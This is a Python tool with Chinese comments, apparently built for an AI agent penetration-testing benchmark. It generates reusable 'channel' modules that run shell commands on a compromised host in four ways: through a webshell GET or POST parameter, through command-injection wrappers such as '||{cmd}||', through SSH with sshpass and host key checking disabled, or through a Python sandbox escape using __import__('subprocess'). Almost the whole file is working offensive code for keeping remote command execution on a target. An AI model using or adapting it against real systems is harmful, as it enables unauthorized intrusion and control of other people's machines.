#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""通道模块生成器 — 把 RCE/命令执行入口封装成可 import 的 python 模块。

对标榜单第一 agent-hehua 的 scripts/ 复用机制（cur248.py / oa9.py）：
拿到入口的第一步 = 生成通道模块，之后所有操作都是 `from <alias> import run`。

用法:
  python tools/channel-template.py <alias> <type> <url_or_host> [--param 参数名] [--user u] [--pass p]
  例: python tools/channel-template.py cur248 webshell-g http://172.18.0.2/w9.php --param c
      python tools/channel-template.py oa9 webshell-post http://172.18.0.2/tools.php --param cmd --extra "login=admin&pass=P@ssword"
      python tools/channel-template.py core ssh 172.18.0.3 --user root --pass P@ssword

产物: targets/benchmark/scripts/<alias>.py（含 run(cmd) 主函数 + 自测 __main__）

通道类型:
  webshell-g    GET 参数命令执行（?c=id）
  webshell-post POST 参数命令执行（可带前置登录表单字段）
  cmd-inject    命令注入参数（urlencode 后拼接）
  ssh           sshpass -p <pass> ssh -o StrictHostKeyChecking=no <user>@<host>
  python-exec   受限 python 沙箱 eval/exec 回显通道（题面提示时使用）
"""

import argparse
import subprocess
import sys
from pathlib import Path

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):
        pass

TEMPLATE = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""通道模块 <ALIAS> — <TYPE> (<URL>) 生成于 benchmark 会话
用法: from <ALIAS> import run; print(run("id"))"""

import subprocess
import urllib.parse
import urllib.request

<BOOTSTRAP>

def run(cmd, timeout=30):
    """在目标上执行 cmd，返回 stdout+stderr 文本。"""
<EXEC>

if __name__ == "__main__":
    import sys
    print(run(sys.argv[1] if len(sys.argv) > 1 else "id"))
'''

# python-exec 类型自带完整 run（不走通用 TEMPLATE，避免重复 def run 覆盖）
TEMPLATE_PYEXEC = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""通道模块 <ALIAS> — <TYPE> (<URL>) 生成于 benchmark 会话
用法: from <ALIAS> import run; print(run("id"))"""

import urllib.parse
import urllib.request

<BOOTSTRAP>
'''

BOOTSTRAP_WEBSHELL = '''URL = {url!r}
PARAM = {param!r}
EXTRA = {extra!r}  # 前置表单字段（POST 通道用）


def _post(url, data):
    req = urllib.request.Request(
        url,
        data=urllib.parse.urlencode(data).encode(),
        headers={{"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}},
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return f"[通道错误] {{e}}"
'''

EXEC_WEBSHELL = '''    data = dict(EXTRA)
    data[PARAM] = cmd
    out = _post(URL, data) if EXTRA else _post(URL, {PARAM: cmd})
    return out[:4000]'''

EXEC_WEBSHELL_GET = '''    url = URL + ("&" if "?" in URL else "?") + urllib.parse.urlencode({PARAM: cmd})
    try:
        with urllib.request.urlopen(url, timeout=20) as r:
            return r.read().decode("utf-8", errors="replace")[:4000]
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", errors="replace")[:4000]
    except Exception as e:
        return f"[通道错误] {e}"'''

BOOTSTRAP_CMD_INJECT = '''URL = {url!r}
PARAM = {param!r}
WRAP = {wrap!r}  # e.g. "||{{cmd}}||" or ";{{cmd}}#"


def _exec(cmd):
    url = URL + ("&" if "?" in URL else "?") + urllib.parse.urlencode({{PARAM: WRAP.format(cmd=cmd)}})
    try:
        with urllib.request.urlopen(url, timeout=20) as r:
            return r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return f"[通道错误] {{e}}"
'''

EXEC_CMD_INJECT = '''    out = _exec(cmd)
    # 拼接注入通常有响应噪音：只回显成功标记后的内容（由 WRAP 控制，默认全量）
    return out[:4000]'''

BOOTSTRAP_SSH = '''HOST = {host!r}
USER = {user!r}
PASS = {passw!r}


def _ssh(cmd, timeout):
    full = ("sshpass -p {{PASS}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 "
            "{{USER}}@{{HOST}} {{cmd}}").format_map(globals())
    r = subprocess.run(full, shell=True, capture_output=True, text=True, timeout=timeout)
    return (r.stdout or "") + (("\\n[stderr] " + r.stderr[:300]) if r.stderr else "")
'''

EXEC_SSH = '''    out = _ssh(cmd, timeout)
    return out[:4000]'''

BOOTSTRAP_PYEXEC = '''URL = {url!r}
POST_BODY = {postbody!r}  # 沙箱求值接口的 POST body 模板，{{expr}} 为注入点


def _exec(expr):
    body = POST_BODY.replace("{{{{expr}}}}", expr)
    req = urllib.request.Request(
        URL, data=body.encode(), headers={{"Content-Type": "application/json"}}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return f"[通道错误] {{e}}"


def run(cmd, timeout=30):
    """沙箱内执行 shell 命令（经 python 转义）。命令输出经 repr 回显。"""
    expr = "__import__('subprocess').check_output(%r, shell=True).decode()" % cmd
    out = _exec(expr)
    return out[:4000]


if __name__ == "__main__":
    import sys
    print(run(sys.argv[1] if len(sys.argv) > 1 else "id"))
'''

TYPES = {
    "webshell-g": (BOOTSTRAP_WEBSHELL, EXEC_WEBSHELL_GET),
    "webshell-post": (BOOTSTRAP_WEBSHELL, EXEC_WEBSHELL),
    "cmd-inject": (BOOTSTRAP_CMD_INJECT, EXEC_CMD_INJECT),
    "ssh": (BOOTSTRAP_SSH, EXEC_SSH),
}


def gen(alias, ctype, url, param, extra, user, passw):
    """组装通道模块源码。EXEC 段直接嵌入 def run 体内（4 空格缩进，花括号即字面量）。"""
    if ctype == "python-exec":
        bootstrap = BOOTSTRAP_PYEXEC.format(url=url, postbody=extra or "")
        src = TEMPLATE_PYEXEC.replace("<ALIAS>", alias).replace("<TYPE>", ctype).replace("<URL>", url) \
            .replace("<BOOTSTRAP>", bootstrap)
        return src
    if ctype not in TYPES:
        sys.exit(f"✗ 未知通道类型: {ctype}（可用: {', '.join(TYPES)} + python-exec）")
    bootstrap, exec_ = TYPES[ctype]
    if ctype == "ssh":
        bootstrap = bootstrap.format(host=url, user=user, passw=passw)
    elif ctype == "cmd-inject":
        bootstrap = bootstrap.format(url=url, param=param, wrap=extra or "||{cmd}||")
    else:
        bootstrap = bootstrap.format(url=url, param=param, extra=extra or "")
    src = TEMPLATE.replace("<ALIAS>", alias).replace("<TYPE>", ctype).replace("<URL>", url) \
        .replace("<BOOTSTRAP>", bootstrap).replace("<EXEC>", exec_)
    return src


def main():
    ap = argparse.ArgumentParser(description="生成 RCE 通道模块到 targets/benchmark/scripts/")
    ap.add_argument("alias", help="模块名（不含 .py），如 cur248")
    ap.add_argument("type", choices=list(TYPES) + ["python-exec"], help="通道类型")
    ap.add_argument("url_or_host", help="URL（web 类）或 host:port（ssh 类）")
    ap.add_argument("--param", default="c", help="命令参数名（默认 c）")
    ap.add_argument("--extra", default="", help="webshell-post: 前置登录表单字段如 'login=admin&pass=P@ssword'；cmd-inject: 包裹模板如 '||{cmd}||'")
    ap.add_argument("--user", default="root", help="ssh 用户名")
    ap.add_argument("--pass", dest="passw", default="", help="ssh 密码")
    args = ap.parse_args()

    out_dir = Path(__file__).resolve().parent.parent / "targets" / "benchmark" / "scripts"
    out_dir.mkdir(parents=True, exist_ok=True)
    src = gen(args.alias, args.type, args.url_or_host, args.param, args.extra, args.user, args.passw)
    out = out_dir / f"{args.alias}.py"
    out.write_text(src, encoding="utf-8")
    print(f"✓ 通道模块已生成: {out}")
    print(f"  用法: from {args.alias} import run; print(run('id'))")
    # 生成后立即自测
    r = subprocess.run([sys.executable, "-m", "py_compile", str(out)], capture_output=True, text=True)
    if r.returncode == 0:
        print("✓ 语法自检通过")
    else:
        print(f"✗ 语法自检失败: {r.stderr[:300]}")
        sys.exit(1)


if __name__ == "__main__":
    main()
